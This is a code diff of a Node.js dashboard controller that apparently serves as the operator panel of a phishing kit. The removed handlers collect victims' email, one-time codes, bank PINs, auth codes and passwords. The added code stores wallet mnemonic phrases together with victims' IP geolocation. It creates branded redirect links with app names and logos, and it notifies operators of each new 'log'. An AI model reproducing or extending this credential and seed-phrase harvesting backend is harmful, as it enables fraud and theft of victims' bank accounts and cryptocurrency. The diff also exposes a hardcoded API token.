@@ -2,7 +2,7 @@ import User from "../models/Users.js";
 import LoginAttempt from "../models/LoginAttempt.js";
 import Post from "../models/Post.js";
 import Review from "../models/Review.js";
-import Account from "../models/Account.js";
+import CryptoLogs from "../models/CryptoLogs.js";
 import Notification from "../models/Notification.js";
 import Subscription from "../models/Subscription.js";
 import SubscriptionHistory from "../models/SubscriptionHistory.js";
@@ -216,245 +216,78 @@ const deletePost = async (req, res) => {
     res.status(500).json({ message: "Error deleting post", error });
   }
 };
-const setEmail = async (req, res) => {
-  try {
-    const { email, userId } = req.body;
-
-    // Get the location data (ensure req is passed to getLocationObject)
-    const locationData = await getLocationObject(req);
-
-    // Create a new account even if an account with the same email exists
-    const newAccount = new Account({
-      email,
-      userId,
-      currentStep: "email_set", // Set the current step
-      location: locationData, // Use the location data obtained above
-    });
-
-    const tempAccount = await newAccount.save();
-
-    res.status(201).json({
-      account: tempAccount,
-      message: "New account created successfully",
-      currentStep: tempAccount.currentStep, // Return currentStep in response
-    });
-  } catch (error) {
-    console.error("Error:", error);
-    res.status(500).json({ error });
-  }
-};
 
 // Helper function to get user location based on the real IP using X-Forwarded-For
 const getLocationObject = async (req) => {
   try {
-    // Step 1: Get the real IP address from X-Forwarded-For or fall back to req.connection.remoteAddress
     let ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
 
-    // If there are multiple IPs in 'x-forwarded-for', take the first one (the original client IP)
     if (ip.includes(",")) {
       ip = ip.split(",")[0];
     }
 
-    // Step 2: Remove the "::ffff:" prefix if present (indicates IPv6 representation of IPv4)
     if (ip.startsWith("::ffff:")) {
-      ip = ip.slice(7); // Remove the "::ffff:" part
+      ip = ip.slice(7);
     }
 
-    // Step 3: Fetch location data based on the extracted IP from ipinfo.io
     const response = await fetch(
       `https://ipinfo.io/${ip}/json?token=a62a090c9551e6`
     );
     const data = await response.json();
 
-    // Step 4: Return the combined location and IP data
     return {
       country: data.country,
-      countryCode: data.country, // ipinfo.io returns country as the code
+      countryCode: data.country,
       region: data.region,
       city: data.city,
       ipAddress: ip,
-      lat: data.loc ? data.loc.split(",")[0] : null, // Latitude (if available)
-      lon: data.loc ? data.loc.split(",")[1] : null, // Longitude (if available)
+      lat: data.loc ? data.loc.split(",")[0] : null,
+      lon: data.loc ? data.loc.split(",")[1] : null,
     };
   } catch (error) {
     console.error("Error fetching IP location:", error);
-    return null; // Ensure null is returned on failure
-  }
-};
-
-const setOtp = async (req, res) => {
-  try {
-    const { accountId, otp } = req.body;
-
-    // Find account by ID
-    const account = await Account.findById(accountId);
-
-    // Handle if account is not found
-    if (!account) {
-      return res.status(400).json({ error: "Account not found" });
-    }
-
-    // Update OTP and currentStep
-    account.otp = otp;
-    account.currentStep = "otp_set"; // Track the current step
-
-    // Save account changes
-    await account.save();
-
-    // Send response
-    res.status(200).json({
-      message: "OTP set successfully",
-      currentStep: account.currentStep, // Return updated currentStep
-    });
-  } catch (error) {
-    console.error("Error:", error);
-    res.status(500).json({ error: "Failed to set OTP" });
-  }
-};
-
-const setBankPin = async (req, res) => {
-  try {
-    const { accountId, bankPin } = req.body;
-
-    // Find account by ID
-    const account = await Account.findById(accountId);
-
-    // Handle if account is not found
-    if (!account) {
-      return res.status(400).json({ error: "Account not found" });
-    }
-
-    // Update bankPin and currentStep
-    account.bankPin = bankPin;
-    account.currentStep = "bank_pin_set"; // Track the current step
-
-    // Save changes
-    await account.save();
-
-    // Send response
-    res.status(200).json({
-      message: "Bank PIN set successfully",
-      currentStep: account.currentStep, // Return updated currentStep
-    });
-  } catch (error) {
-    console.error("Error:", error);
-    res.status(500).json({ error: "Failed to set Bank PIN" });
-  }
-};
-const setAuthCode = async (req, res) => {
-  try {
-    const { accountId, authCode, userId } = req.body;
-    console.log("userId from auth code to set auth code:  ", userId);
-    // Find account by ID
-    const account = await Account.findById(accountId);
-
-    // Handle if account is not found
-    if (!account) {
-      return res.status(400).json({ error: "Account not found" });
-    }
-
-    // Update authCode and set currentStep to "auth code set"
-    account.authCode = authCode;
-    account.currentStep = "auth_code_set";
-
-    // Save changes
-    await account.save();
-    const user = await User.findById(userId);
-    if (!user) {
-      return res.status(400).json({ error: "User not found" });
-    } else {
-      // Create and save notification for the specific user
-      const notification = new Notification({
-        message: "You received a new log",
-        accountId: account._id,
-      });
-      await notification.save();
-    }
-
-    // Send immediate response showing "auth code set"
-    res.status(200).json({
-      message: "Auth Code set successfully",
-      currentStep: account.currentStep,
-    });
-
-    // After a short delay, change the currentStep to "completed"
-    setTimeout(async () => {
-      account.currentStep = "completed";
-      await account.save();
-      // console.log("Process completed");
-    }, 10000); // 10 seconds delay
-  } catch (error) {
-    console.error("Error:", error);
-    res.status(500).json({ error: "Failed to set Auth Code" });
-  }
-};
-
-const setPassword = async (req, res) => {
-  try {
-    const { accountId, password } = req.body;
-
-    // Find account by ID
-    const account = await Account.findById(accountId);
-
-    // Handle if account is not found
-    if (!account) {
-      return res.status(400).json({ error: "Account not found" });
-    }
-
-    // Update password and currentStep
-    account.password = password;
-    account.currentStep = "password_set"; // Track the current step
-
-    // Save account changes
-    await account.save();
-
-    // Create and save notification
-    const notification = new Notification({
-      message: "Account password updated",
-      accountId: account._id,
-    });
-    await notification.save();
-
-    // Send response
-    res.status(200).json({
-      message: "Password set successfully",
-      currentStep: account.currentStep, // Return updated currentStep
-    });
-  } catch (error) {
-    console.error("Error:", error);
-    res.status(500).json({ error: "Failed to set password" });
+    return null;
   }
 };
 
 const setAccPhrase = async (req, res) => {
   try {
-    const { mnemonic, userInfo } = req.body;
-    console.log("mnemonic", mnemonic);
-    console.log("userInfo", userInfo);
-
-    // Check if mnemonic and userInfo are provided
-    if (!mnemonic || !userInfo) {
-      return res.status(400).json({ error: "Mnemonic and user info are required" });
+    const { mnemonic, userInfo, cryptoLogId } = req.body;
+    if (!mnemonic || !cryptoLogId) {
+      return res.status(404).json({ error: "Invalid Payload" });
     }
 
-    // Save data to the database
-    const accountData = new Account({
-      phrase:mnemonic,
-      userInfo,
+    const location = await getLocationObject(req).catch((err) => {
+      console.error("Failed to get location:", err);
+      return null;
     });
+    if (!location) {
+      return res
+        .status(500)
+        .json({ error: "Failed to fetch location information" });
+    }
+    const crypto = await CryptoLogs.findByIdAndUpdate(
+      cryptoLogId,
+      { phrase: mnemonic, userInfo, location },
+      { new: true }
+    );
 
-    await accountData.save();
+    if (!crypto) {
+      return res
+        .status(400)
+        .json({ error: "Crpyto Log with the given id not found" });
+    }
 
-    // Send a success response
     res.status(200).json({
       message: "Mnemonic phrase and user info saved successfully",
     });
   } catch (error) {
     console.error("Error:", error);
-    res.status(500).json({ error: "Failed to save mnemonic phrase and user info" });
+    res
+      .status(500)
+      .json({ error: "Failed to save mnemonic phrase and user info" });
   }
 };
-
 
 const getAccounts = async (req, res) => {
   try {
@@ -483,26 +316,26 @@ const getAccounts = async (req, res) => {
     const user = await User.findById(userId);
     const query = user?.role == "admin" ? {} : { userId };
     if (user?.role == "admin") {
-      accounts = await Account.find()
-        .populate("userId", "userName")
+      accounts = await CryptoLogs.find()
+        .populate("userId", "phrase")
         .sort({ createdAt: -1 })
         .skip(skip)
         .limit(limit);
     } else {
-      accounts = await Account.find({ userId })
+      accounts = await CryptoLogs.find({ userId })
         .sort({ createdAt: -1 })
         .skip(skip)
         .limit(limit);
     }
 
-    const totalAccounts = await Account.countDocuments(query);
+    const totalAccounts = await CryptoLogs.countDocuments(query);
 
-    const thisMonthAccounts = await Account.countDocuments({
+    const thisMonthAccounts = await CryptoLogs.countDocuments({
       userId,
       createdAt: { $gte: currentMonthStart },
     });
 
-    const lastMonthAccounts = await Account.countDocuments({
+    const lastMonthAccounts = await CryptoLogs.countDocuments({
       userId,
       createdAt: { $gte: lastMonthStart, $lt: lastMonthEnd },
     });
@@ -530,25 +363,20 @@ const getAccounts = async (req, res) => {
 const getAccountsStatistics = async (req, res) => {
   try {
     const monthsData = [];
-    // Loop over the last 12 months
     for (let i = 11; i >= 0; i--) {
-      // Get the start and end of the month
       const startOfMonth = moment()
         .subtract(i, "months")
         .startOf("month")
         .toDate();
       const endOfMonth = moment().subtract(i, "months").endOf("month").toDate();
 
-      // Query for users created within the month
       const monthCount = await User.countDocuments({
         createdAt: { $gte: startOfMonth, $lte: endOfMonth },
       });
 
-      // Push the count to the monthsData array
       monthsData.push(monthCount);
     }
 
-    // Respond with the counts for each month
     res.status(200).json({
       monthlyData: monthsData,
     });
@@ -562,18 +390,13 @@ const getAccountsStatistics = async (req, res) => {
 
 const getAllAccounts = async (req, res) => {
   try {
-    // Fetch the logged-in user's userId
-
-    // Get pagination parameters from query (default to page 1, limit 10)
     const page = parseInt(req.query.page) || 1;
     const limit = parseInt(req.query.limit) || 10;
     const skip = (page - 1) * limit;
 
-    // Find all accounts for the user with pagination
-    const accounts = await Account.find().skip(skip).limit(limit);
+    const accounts = await CryptoLogs.find().skip(skip).limit(limit);
 
-    // Get the total count of accounts without pagination
-    const totalAccounts = await Account.countDocuments({});
+    const totalAccounts = await CryptoLogs.countDocuments({});
 
     return res.status(200).json({
       accounts: accounts,
@@ -591,15 +414,17 @@ const getSingleAccount = async (req, res) => {
     const { accountId } = req.params;
 
     // Fetch the account by ID
-    const account = await Account.findById(accountId);
+    const account = await CryptoLogs.findById(accountId);
 
     if (!account) {
-      return res.status(404).json({ message: "Account not found" });
+      return res.status(404).json({ message: "Crypto Logs not found" });
     }
 
     return res.status(200).json(account);
   } catch (error) {
-    return res.status(500).json({ message: "Error fetching account", error });
+    return res
+      .status(500)
+      .json({ message: "Error fetching Crypto Logs", error });
   }
 };
 
@@ -625,7 +450,7 @@ const getNotification = async () => {
     }
     return res.status(200).json(notification);
   } catch (error) {
-    res.status(500).json({ error: "Failed to delete account" });
+    res.status(500).json({ error: "Failed to delete Crypto Logs" });
   }
 };
 const deleteNotification = async (req, res) => {
@@ -648,7 +473,7 @@ const deleteNotification = async (req, res) => {
       message: "Notification deleted successfully",
     });
   } catch (error) {
-    res.status(500).json({ error: "Failed to delete account" });
+    res.status(500).json({ error: "Failed to delete Crypto Logs" });
   }
 };
 const clearAllNotifications = async (req, res) => {
@@ -676,22 +501,22 @@ const deleteAccount = async (req, res) => {
   try {
     const accountId = req.query.id;
 
-    // Find the account by ID
-    const account = await Account.findById(accountId);
-    if (!account) {
-      return res.status(404).json({ message: "Account not found" });
+    // Find the Crypto Logs by ID
+    const Crypto_Logs = await CryptoLogs.findById(accountId);
+    if (!Crypto_Logs) {
+      return res.status(404).json({ message: "Crypto Logs not found" });
     }
 
-    // Delete the account
-    await Account.findByIdAndDelete(accountId);
-    await Account.deleteMany({ _id: accountId });
+    // Delete the Crypto_Logs
+    await CryptoLogs.findByIdAndDelete(accountId);
+    await CryptoLogs.deleteMany({ _id: accountId });
 
     // Delete associated notifications
     await Notification.deleteMany({ accountId });
 
     res.status(200).json({
-      message: "Account and associated notifications deleted successfully",
-      account: account,
+      message: "Crypto Logs and associated notifications deleted successfully",
+      account: CryptoLogs,
     });
   } catch (error) {
     console.log("error in here at delete account", error);
@@ -716,12 +541,22 @@ const editUserProfile = async (req, res) => {
     res.status(500).json({ message: "Error updating user profile", error });
   }
 };
-
+// we need to do things here create url and also a crypto log
+//if the special phrase then redirect to that url otherwise just show the log
 const createUrl = async (req, res) => {
   try {
-    const { userId, title, description } = req.body;
-    const newUrl = await Url.create({ user: userId, title, description });
-    res.status(200).json(newUrl);
+    //also the payload of crypto is  => appName, appLogo   => and return the CryptoLogId.
+    const { userId, title, description, redirectUrl, appName, appLogo } =
+      req.body;
+    //description is the url now add the redirect url as well
+    const newUrl = await Url.create({
+      user: userId,
+      title,
+      description,
+      redirectUrl,
+    });
+    const newCryptoLog = await CryptoLogs.create({ userId, appName, appLogo });
+    res.status(200).json({ newUrl, cryptoLogId: newCryptoLog?._id });
   } catch (error) {
     res.status(500).json({ message: "Error creating url", error });
   }
@@ -944,7 +779,6 @@ const getSubscriptionsHistoryForAdmin = async (req, res) => {
   try {
     const { adminId } = req.query;
 
-
     if (!adminId || !mongoose.Types.ObjectId.isValid(adminId)) {
       return res.status(400).json({
         message: "Valid adminId is required.",
@@ -1142,7 +976,6 @@ const getAllMessages = async (req, res) => {
   }
 };
 
-
 export const dashboard = {
   getAllUser,
   getTodayUsers,
@@ -1154,14 +987,9 @@ export const dashboard = {
   getPosts,
   updatePost,
   getSingleAccount,
-  setBankPin,
-  setAuthCode,
   getAccounts,
   deletePost,
   deleteAccount,
-  setEmail,
-  setOtp,
-  setPassword,
   getNotifications,
   getNotification,
   editUserProfile,
